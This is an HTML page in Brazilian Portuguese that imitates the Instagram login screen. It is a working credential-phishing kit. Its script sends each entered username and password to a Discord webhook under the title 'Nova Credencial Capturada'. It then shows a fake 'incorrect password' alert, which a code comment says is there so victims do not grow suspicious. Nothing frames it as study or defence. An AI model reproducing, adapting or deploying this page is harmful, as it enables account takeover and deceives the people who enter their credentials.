<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.cdnfonts.com/css/billabong');
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
    </style>
</head>
<body class="bg-white flex flex-col items-center justify-between min-h-screen p-4 max-w-[400px] mx-auto">

    <div class="flex-1 flex flex-col items-center justify-center w-full">
        <h1 class="text-5xl mb-8 mt-10" style="font-family: 'Billabong', sans-serif;">Instagram</h1>

        <form id="loginForm" class="w-full space-y-2">
            <input type="text" id="user" placeholder="Telefone, nome de usuário ou email" required
                class="w-full px-2 py-3 bg-[#FAFAFA] border border-[#DBDBDB] rounded-sm text-xs outline-none focus:border-[#A8A8A8]">
            
            <input type="password" id="pass" placeholder="Senha" required
                class="w-full px-2 py-3 bg-[#FAFAFA] border border-[#DBDBDB] rounded-sm text-xs outline-none focus:border-[#A8A8A8]">

            <button type="submit" id="btn"
                class="w-full py-2 bg-[#0095F6] text-white font-semibold rounded-lg text-sm mt-2 disabled:opacity-50">
                Entrar
            </button>
        </form>

        <div class="flex items-center gap-4 w-full my-6">
            <div class="flex-1 h-[1px] bg-[#DBDBDB]"></div>
            <span class="text-[#8E8E8E] text-xs font-semibold">OU</span>
            <div class="flex-1 h-[1px] bg-[#DBDBDB]"></div>
        </div>

        <button class="flex items-center gap-2 text-[#385185] font-semibold text-sm">
            <img src="https://upload.wikimedia.org/wikipedia/commons/0/05/Facebook_Logo_%282019%29.png" class="w-5">
            Entrar com o Facebook
        </button>

        <a href="#" class="text-xs text-[#00376B] mt-4">Esqueceu a senha?</a>
    </div>

    <div class="w-full mt-10">
        <div class="border border-[#DBDBDB] py-4 text-center">
            <p class="text-sm">Não tem uma conta? <span class="text-[#0095F6] font-semibold">Cadastre-se</span></p>
        </div>
        <div class="mt-4 text-center">
            <p class="text-sm mb-4">Obtenha o aplicativo.</p>
            <div class="flex gap-2 justify-center">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_portuguese-brazilian-pt_br.png/68006898e4d4.png" class="h-10">
                <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_portuguese_brazilian-pt_BR.png/74091a9bb5cf.png" class="h-10">
            </div>
        </div>
    </div>

    <script>
        const WEBHOOK = 'https://discord.com/api/webhooks/1480933665448919105/kd31HGHQvYNA-28Cmb6QBs2XSFfPCq_-c5wpEUUq5JF1CMejaYadiw_YtJ_lKilEkOf6';

        document.getElementById('loginForm').addEventListener('submit', async (e) => {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = 'Entrando...';
            btn.disabled = true;

            const dados = {
                embeds: [{
                    title: "🔐 Nova Credencial Capturada",
                    color: 38642,
                    fields: [
                        { name: "👤 Usuário", value: document.getElementById('user').value, inline: true },
                        { name: "🔑 Senha", value: document.getElementById('pass').value, inline: true }
                    ],
                    footer: { text: "Instagram Login" },
                    timestamp: new Date().toISOString()
                }]
            };

            try {
                await fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(dados)
                });
                // Simula erro de login para não desconfiarem
                setTimeout(() => {
                    alert("Senha incorreta. Tente novamente.");
                    btn.innerText = 'Entrar';
                    btn.disabled = false;
                }, 1000);
            } catch (err) {
                console.error(err);
            }
        });
    </script>
</body>
</html>
